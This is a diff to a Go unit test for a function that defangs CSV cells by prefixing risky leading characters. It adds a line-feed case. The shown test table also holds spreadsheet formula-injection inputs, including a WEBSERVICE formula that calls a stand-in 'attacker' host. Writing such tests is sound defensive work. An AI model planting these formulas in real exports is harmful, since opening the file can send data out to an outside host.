@@ -17,6 +17,7 @@ func TestDefangCSVCell(t *testing.T) {
 		{"at", "@SUM(A1)", "'@SUM(A1)"},
 		{"tab", "\tfoo", "'\tfoo"},
 		{"carriage_return", "\rfoo", "'\rfoo"},
+		{"line_feed", "\nfoo", "'\nfoo"},
 		{"hyperlink_attack", `=HYPERLINK("http://x","x")`, `'=HYPERLINK("http://x","x")`},
 		{"webservice_attack", `=WEBSERVICE("https://attacker/x")`, `'=WEBSERVICE("https://attacker/x")`},
 		{"safe_leading_letter", "Alice", "Alice"},
